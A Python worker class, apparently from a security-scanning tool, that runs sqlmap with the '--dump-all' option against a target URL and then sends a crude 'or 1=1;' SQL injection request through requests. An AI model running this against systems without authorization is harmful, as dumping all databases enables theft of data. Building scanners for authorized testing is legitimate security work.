import json

import requests

from project.workers.consts import ParentWorker
from project.workers.web.consts import WorkerNames
from project.workers.web.serializers import SqlInjectionSerializer
from project.workers.base import BaseWorker
import subprocess


class SqlInjectionWorker(BaseWorker):
    parent = ParentWorker.WEB.value
    name = WorkerNames.SCAN.value
    serializer = SqlInjectionSerializer

    def run(self):
        target = self.serialized_data.get("target")

        if "http" not in target:
            target = f"http://{target}:10201/get/?id=1"

        process = subprocess.run(
            args=[
                "sqlmap", "-u", target,
                "-a", "--batch", "--dump-all", "--random-agent"
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        r = requests.get(f"{target} or 1=1;")



        # print(process.stdout.decode("utf-8"))

        # if process.returncode != 0:
        #     raise Exception(process.stderr.decode("utf-8"))

        # return {"message":  process.stdout.decode("utf-8")}

        return {
            "name": "SQL-Injection",
            "host": target,
            "messages": r.json()
        }

    def format(self, **kwargs):
        return kwargs

